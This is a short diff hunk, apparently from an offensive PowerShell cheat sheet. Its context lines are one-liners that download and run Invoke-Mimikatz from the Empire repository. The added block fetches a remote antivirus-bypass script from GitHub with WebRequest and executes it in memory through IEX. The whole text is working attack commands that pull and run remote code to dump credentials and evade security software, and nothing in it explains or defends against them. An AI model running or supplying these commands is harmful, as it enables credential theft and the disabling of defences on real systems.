@@ -21,3 +21,12 @@ IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com
 IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 powershell get-item function:
 ```
+```
+$webreq = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1')
+$resp=$webreq.GetResponse()
+$respstream=$resp.GetResponseStream()
+$reader=[System.IO.StreamReader]::new($respstream)
+$content=$reader.ReadToEnd()
+IEX($content);Invoke-AlokS-AvBypass
+
+```
